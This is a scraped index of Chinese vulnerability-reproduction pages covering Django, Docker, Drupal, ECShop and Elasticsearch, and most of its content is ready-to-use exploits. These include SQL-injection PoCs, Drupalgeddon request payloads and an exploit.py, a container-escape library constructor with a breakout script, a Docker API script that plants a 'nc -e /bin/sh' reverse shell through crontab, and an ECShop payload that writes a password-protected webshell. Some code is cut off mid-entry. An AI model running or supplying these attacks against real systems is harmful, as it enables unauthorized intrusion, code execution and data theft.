在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。 该漏洞利用条件是目标URLCONF中存在能匹配上//example.com的规则。 二、漏洞影响 Django 三、复现过程 访问http://your-ip:8000//www.example.com，即可返回是301跳转到//www.example.com/： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:32:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Django/CVE-2020-7471.html":{"url":"0day/Django/CVE-2020-7471.html","title":"（CVE-2020-7471）Django sql注入漏洞","keywords":"","body":"（CVE-2020-7471）Django sql注入漏洞 一、漏洞简介 Django是高水准的由Python编程语言驱动的一个开源Web应用程序框架，起源于开源社区。使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序，应用广泛。2020年2月初，Django 官方发布安全通告公布了一个通过StringAgg（分隔符）实现利用的潜在SQL注入漏洞（CVE-2020-7471）。攻击者可通过构造分隔符传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义并注入恶意SQL语句 二、漏洞影响 Django 1.11.x 三、复现过程 环境安装 安装 django 漏洞版本，我测试用的是 pip install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple 参考 https://www.runoob.com/postgresql/windows-install-postgresql.html 完成 postgres 数据库的安装 新建数据库 CREATE DATABASE test; 修改 sqlvul_projects/settings.py 里面的数据库配置，如果上一步你安装用的默认配置（包括设置密码为postgres），就无需修改任何配置，可以跳过这一步 DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'test', # 数据库名称 'USER': 'postgres', 'PASSWORD': 'postgres', # 数据库用户密码 'HOST': '127.0.0.1', # 数据库地址 'PORT': '5432', } } 通过 django 初始化数据表 python3 manage.py migrate python3 manage.py makemigrations vul_app python3 manage.py migrate vul_app poc # encoding:utf-8 import os import django os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"sqlvul_project.settings\") # Django 版本大于等于1.7的时候，需要加上下面两句 if django.VERSION >= (1, 7):#自动判断版本 django.setup() from vul_app.models import Info from django.contrib.postgres.aggregates import StringAgg from django.db.models import Count \"\"\" postgres 预先执行的SQL CREATE DATABASE test; \\c test; \\d 列出当前数据库的所有表格 \"\"\" def initdb(): data = [('li','male'),('zhao','male'),('zhang','female')] for name,gender in data: Info.objects.get_or_create(name=name,gender=gender) def query(): # FUZZ delimiter error_c = [] other_error_c = [] for c in \"!@#$%^&*()_+=-|\\\\\\\"':;?/>.然后运行 POC 脚本CVE-2020-7471.py就可以了 漏洞环境及其poc下载地址：https://github.com/ianxtianxt/CVE-2020-7471 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-19 20:46:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Docker/1.html":{"url":"0day/Docker/1.html","title":"Docker 未授权访问","keywords":"","body":"Docker 未授权访问 一、漏洞简介 1. 基础介绍 http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8 docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。 漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。 然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。 2. 测试环境配置 先关闭docker，然后开启： sudo service docker stop # 绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。 sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 参考API规范进行渗透：https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/ 操作Docker API可以使用python dockert api 完成。 pip install docker-py API使用参考：https://docker-py.readthedocs.io/en/stable/api/##client-api 二、影响范围 三、复现过程 利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。 import docker client = docker.DockerClient(base_url='http://your-ip:2375/') data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) 写入crontab文件，成功反弹shell： python脚本 https://github.com/ianxtianxt/docker_api_vul 安装类库pip install -r requirements.txt 查看运行的容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 查看所有的容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a 查看所有镜像python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l 查看端口映射python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L 写计划任务（centos,redhat等,加-u参数用于ubuntu等）python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口 写sshkey(自行修改脚本的中公钥)python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k 在容器中执行命令python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e \"id\" -I 容器id 删除容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id 修改client api版本python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22 查看服务端api版本python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V 3.3 其他的一些exp https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.pyhttps://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8 4. 防护策略 1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker 服务才能生效。 2.修改 Docker 的启动参数： 定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1 或将默认端口 2375 改为自定义端口 为 Remote API 设置认证措施。参照 官方文档 配置 Rem 3.注意：该操作需要重启 Docker 服务才能生效。 修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。 4.注意：该操作需要重启 Docker 服务才能生效。 设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 16:54:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Docker/2.html":{"url":"0day/Docker/2.html","title":"（CVE-2019-14271）Docker copy漏洞","keywords":"","body":"（CVE-2019-14271）Docker copy漏洞 一、漏洞简介 二、漏洞影响 Docker 19.03.1 三、复现过程 Docker cp Copy命令允许从容器、向容器中、或容器之间复制文件。语法与标准的unix cp命令非常相似。要从容器中复制/var/logs，语法是docker cp container_name:/var/logs /some/host/path。 从下图所示，要从容器中将文件复制出去，Docker使用了一个名为docker-tar的帮助进程。 图 1. 从容器中复制文件 docker-tar是通过chroot到容器，将请求的文件或目录存档，然后将生成的tar文件传递给Docker daemon，然后由daemon提取到主机的目标目录中。 注释：CHROOT就是Change Root，也就是改变程序执行时所参考的根目录位置。CHROOT可以增进系统的安全性，限制使用者能做的事。 图 2. docker-tar chroot到容器中 Chroot主要是为了避免系统链接的问题，当主机进程尝试访问容器中的文件时就可能会引发系统链接问题。如果访问的文件中有系统链接，就会解析到host root。因此，攻击者控制的容器就可以尝试和诱使docker cp在主机而非容器上读写文件。去年有许多Docker和Podman相关的系统链接CVE漏洞。通过chroot到容器的root，docker-tar可以确保所有系统链接都可以高效地解析。 但，chroot到容器然后从容器中复制文件可能会引发很严重的安全问题。 CVE-2019-14271 Docker是用Golang语言编写。有漏洞的Docker版本是用Go v1.11编译的。在该版本中，一些含有嵌入C代码（cgo）的包会在运行时动态加载共享的库。这些包包括net和os/user，都是docker-tar使用的，而且在运行时会加载多个libnss_*.so库。一般来说，库是从host文件系统加载的，但因为docker-tarchroot到了容器，因此会从容器文件系统中加载库。也就是说docker-tat会加载和执行来源于容器或由容器控制的代码。 需要说明的是，除了chroot到容器文件系统外，docker-tar并没有被容器化。它是在host命名空间运行的，权限为root全新且不受限于cgroups或seccomp。因此，通过注入代码到docker-tar，恶意容器就可以获取host主机的完全root访问权限。 可能的攻击场景有Docker用户从另一个Docker处复制文件： 容器运行含有恶意libnss_*.so库的镜像 容器中含有被攻击者替换的libnss_*.so库 在这两种情况下，攻击者都可以获取主机上的root代码执行权限。 漏洞利用 为利用该漏洞，研究人员需要先创建一个恶意libnss库。研究人员随意选择了libnss_files.so文件，下载了库函数的源码，并在代码中加入了一个函数——run_at_link()。研究人员还为该函数定义了constructor属性。constructor属性表明run_at_link函数在进程加载时会作为库的初始化函数执行。也就是说，当Docker-tar进程动态加载恶意库时，run_at_link函数就会执行。下面是run_at_link的代码： #include ... #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; if (!is_priviliged()) return; rename(ORIGINAL_LIBNSS, LIBNSS_PATH); fprintf(log_fp, \"switched back to the original libnss_file.so\"); if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } 查/proc目录完成的。如果run_at_link运行在docker-tar环境下，那么目录就是空的，因为procfs挂载在/proc上只存在于容器的mount命名空间。 然后，run_at_link会用恶意libnss库替换原始库。这保证了漏洞利用运行的随后进程不会意外加载恶意版本，并触发run_at_link执行。 为简化该漏洞利用，run_at_link会尝试在容器的/breakout路径下运行可执行文件。这样漏洞利用的其他部分就可以用bash写入，而非C语言。让逻辑的其他部分在run_at_link外，意味着在漏洞利用每次变化后无需重新编译恶意库，只需改变breakout二进制文件就可以了。 利用CVE-2019-14271打破Docker 在该漏洞视频中，Docker用户会运行含有恶意libnss_files.so的恶意镜像，然后尝试从容器中复制一些日志。镜像中的/breakout二进制文件是一个简单的bash脚步，会挂载host文件系统到/host_fs的容器中，并将消息写入host的/evil目录。 /breakout脚本代码如下： umount /host_fs && rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /host_fs # mount host root at /host_fs echo \"Hello from within the container!\" > /host_fs/evil 四、参考链接 https://xz.aliyun.com/t/6806 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 14:13:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2014-3704.html":{"url":"0day/Drupal/CVE-2014-3704.html","title":"（CVE-2014-3704）Drupal < 7.32 “Drupalgeddon” sql注入漏洞","keywords":"","body":"（CVE-2014-3704）Drupal 一、漏洞简介 Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。 二、漏洞影响 Drupal 7.0~7.31 三、复现过程 漏洞环境 执行如下命令启动Drupal 7.31环境： docker-compose up -d 环境启动后，访问http://your-ip:8080即可看到Drupal的安装页面，使用默认配置安装即可。 其中，Mysql数据库名填写drupal，数据库用户名、密码为root，地址为mysql： 安装完成后，访问首页： 漏洞复现 该漏洞无需认证，发送如下数据包即可执行恶意SQL语句： POST /?q=node&destination=node HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 120 pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a 可见，信息已被爆出： 参考链接 https://vulhub.org/#/environments/drupal/CVE-2014-3704/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 17:34:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2017-6920.html":{"url":"0day/Drupal/CVE-2017-6920.html","title":"（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞","keywords":"","body":"（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 一、漏洞简介 Drupal是Drupal社区所维护的一套用PHP语言开发的免费、开源的内容管理系统。Drupal7.56之前的7.x版本和8.3.4之前的8.x版本中存在远程代码执行漏洞。远程攻击者可利用该漏洞在受影响应用程序上下文中执行任意代码或造成拒绝服务。 二、漏洞影响 Drupal Drupal 8.3.3 Drupal Drupal 8.3.2 Drupal Drupal 8.3.1 Drupal Drupal 8.2.8 Drupal Drupal 8.2.7 Drupal Drupal 8.2.3 Drupal Drupal 8.2.2 三、复现过程 漏洞环境 执行如下命令启动 drupal 8.3.0 的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 先安装 yaml 扩展 # 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源 cat > sources.list >/usr/local/etc/php/conf.d/docker-php-ext-yaml.ini # 退出容器 exit # 重启容器，CONTAINER换成自己的容器ID docker restart CONTAINER 1.登录一个管理员账号 2.访问 http://127.0.0.1:8080/admin/config/development/configuration/single/import 3.如下图所示，Configuration type 选择 Simple configuration，Configuration name 任意填写，Paste your configuration here 中填写PoC如下： !php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\" 4.点击 Import 后可以看到漏洞触发成功，弹出 phpinfo 页面 Tips： 虽然官方 CPE 信息显示从 8.0.0 开始就有该漏洞，但是在 drupal:8.0.0 容器内并没有复现成功，相同操作在 drupal:8.3.0 则可以复现成功，故基础镜像选择drupal:8.3.0 参考链接 https://vulhub.org/#/environments/drupal/CVE-2017-6920/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 18:07:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2018-7600.html":{"url":"0day/Drupal/CVE-2018-7600.html","title":"（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞","keywords":"","body":"（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞 一、漏洞简介 Drupal是Drupal社区所维护的一套使用PHP语言开发的免费，开源的内容管理系统。版本受到影响：Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。 二、漏洞影响 Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 参考ianxtianxt/CVE-2018-7600，我们向安装完成的drupal发送如下数据包： POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 103 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id 成功执行代码，这个代码最终执行了id命令： exploit.py #!/usr/bin/env python3 import sys import requests print ('################################################################') print ('# Proof-Of-Concept for CVE-2018-7600') print ('# by Vitalii Rudnykh') print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders') print ('# https://github.com/a2u/CVE-2018-7600') print ('################################################################') print ('Provided only for educational or information purposes\\n') target = input('Enter target url (example: https://domain.ltd/): ') # Add proxy support (eg. BURP to analyze HTTP(s) traffic) # set verify = False if your proxy certificate is self signed # remember to set proxies both for http and https # # example: # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # verify = False proxies = {} verify = True url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo \";-)\" | tee hello.txt'} r = requests.post(url, proxies=proxies, data=payload, verify=verify) check = requests.get(target + 'hello.txt', proxies=proxies, verify=verify) if check.status_code != 200: sys.exit(\"Not exploitable\") print ('\\nCheck: '+target+'hello.txt') 参考链接 https://vulhub.org/#/environments/drupal/CVE-2018-7600/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 18:15:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2018-7602.html":{"url":"0day/Drupal/CVE-2018-7602.html","title":"（CVE-2018-7602）Drupal 远程代码执行漏洞","keywords":"","body":"（CVE-2018-7602）Drupal 远程代码执行漏洞 一、漏洞简介 Drupal 7.x版本和8.x版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。 二、漏洞影响 Drupal 7.x版本和8.x 三、复现过程 漏洞环境 执行如下命令启动drupal 7.57的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8081/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 参考ianxtianxt/CVE-2018-7602的PoC。 如下图所示，执行以下命令即可复现该漏洞。示例命令为 id，如图红框中显示，可以执行该命令。 # \"id\"为要执行的命令 第一个drupal为用户名 第二个drupal为密码 python3 drupa7-CVE-2018-7602.py -c \"id\" drupal drupal http://127.0.0.1:8081/ CVE-2018-7602.py #!/usr/bin/env python3 import requests import argparse from bs4 import BeautifulSoup def get_args(): parser = argparse.ArgumentParser( prog=\"drupa7-CVE-2018-7602.py\", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50), epilog= ''' This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 参考链接 https://vulhub.org/#/environments/drupal/CVE-2018-7602/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 18:15:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2019-6339.html":{"url":"0day/Drupal/CVE-2019-6339.html","title":"（CVE-2019-6339）Drupal 远程代码执行漏洞","keywords":"","body":"（CVE-2019-6339）Drupal 远程代码执行漏洞 一、漏洞简介 Drupal core是Drupal社区所维护的一套用PHP语言开发的免费、开源的内容管理系统。 Drupal core 7.62之前的7.x版本、8.6.6之前的8.6.x版本和8.5.9之前的8.5.x版本中的内置phar stream wrapper（PHP）存在远程代码执行漏洞。远程攻击者可利用该漏洞执行任意的php代码。 二、漏洞影响 Drupal core 7.62之前的7.x版本、8.6.6之前的8.6.x版本和8.5.9之前的8.5.x版本 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 如下图所示，先使用管理员用户上传头像，头像图片为构造好的 PoC，参考ianxtianxt/PoC的PoC Drupal 的图片默认存储位置为 /sites/default/files/pictures//，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。 访问 http://127.0.0.1:8080/admin/config/media/file-system，在 Temporary directory 处输入之前上传的图片路径，示例为 phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg，保存后将触发该漏洞。如下图所示，触发成功。 参考链接 https://vulhub.org/#/environments/drupal/CVE-2019-6339/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 18:19:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Drupal/CVE-2019-6341.html":{"url":"0day/Drupal/CVE-2019-6341.html","title":"（CVE-2019-6341）Drupal xss漏洞","keywords":"","body":"（CVE-2019-6341）Drupal xss漏洞 一、漏洞简介 Drupal是Drupal社区的一套使用PHP语言开发的开源内容管理系统。 Drupal 7.65之前的7版本、8.6.13之前的8.6版本和8.5.14之前的8.5版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Drupal 7.65之前的7版本、8.6.13之前的8.6版本和8.5.14之前的8.5版本 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。 Drupal 的图片默认存储位置为 /sites/default/files/pictures//，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。 使用PoC上传构造好的伪造GIF文件，PoC参考ianxtianxt/PoC的PoC。 如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。 php cve-2019-6341-exp.php 192.168.11.1 8080 上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。 Tips: 因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。 访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见Drupal 1-click to RCE 分析 参考链接 https://vulhub.org/#/environments/drupal/CVE-2019-6341/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 18:21:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ECShop/1.html":{"url":"0day/ECShop/1.html","title":"ECShop <= 2.7.x sql注入漏洞","keywords":"","body":"ECShop 一、漏洞简介 二、漏洞影响 ECShop（2.x、3.0.x、3.6.x） 三、复现过程 漏洞分析 先看user.php $back_act变量来源于HTTP_REFERER，我们可控。 assign函数用于在模版变量里赋值 再看display函数 读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。 再看insert_mod函数 非常关键的一个地方，这里进行了动态调用 $val传入进来用|分割，参数传入进来时需要被序列化 再看include/lib_insert.php中的insert_ads函数 可以看到这里直接就能注入了 payload GET /user.php?act=login HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;} Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 参考链接 https://cloud.tencent.com/developer/article/1333449 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 15:11:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ECShop/2.html":{"url":"0day/ECShop/2.html","title":"ECShop <= 2.7.x 代码执行漏洞","keywords":"","body":"ECShop 一、漏洞简介 二、漏洞影响 ECShop（2.x、3.0.x、3.6.x） 三、复现过程 漏洞分析 继续看fetch函数 追踪_eval函数 $position_style变量来源于数据库中的查询结构 然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询 payload SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time = '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- - 函数中有一个判断 我们 id传入’/* num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了 var_dump一下 再看fetch函数,传入的参数被fetch_str函数处理了 追踪fetch_str函数，这里的字符串处理流程比较复杂 return preg_replace(\"/{([^\\}\\{\\n]*)}/e\", \"\\$this->select('\\\\1');\", $source); 这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this->select(‘$asd’)的结果 看看select函数 第一个字符为$时进入$this->get_val函数 我们$val没有.$又进入make_var函数 最后这里引入单引号从变量中逃逸 我们要闭合_var所以最终payload是 {$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ=='));//}xxx 会在网站跟目录生成1.txt 里面内容是getshell poc GET /user.php?act=login HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";} Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 会在网站根目录生成1.php 密码是1337 参考链接 https://cloud.tencent.com/developer/article/1333449 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 16:04:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Elasticsearch/1.html":{"url":"0day/Elasticsearch/1.html","title":"Elasticsearch未授权访问","keywords":"","body":"Elasticsearch未授权访问 一、漏洞简介 ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。 二、影响范围 三、复现过程 安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。 http://0-sec.org:9200/_cat/indices 里面的indices包含了_river一般就是安装了river了。 http://0-sec.org:9200/_plugin/head/ web管理界面http://0-sec.org:9200/_cat/indiceshttp://0-sec.org:9200/_river/_search 查看数据库敏感信息http://0-sec.org:9200/_nodes 查看节点数据 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 01:43:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && 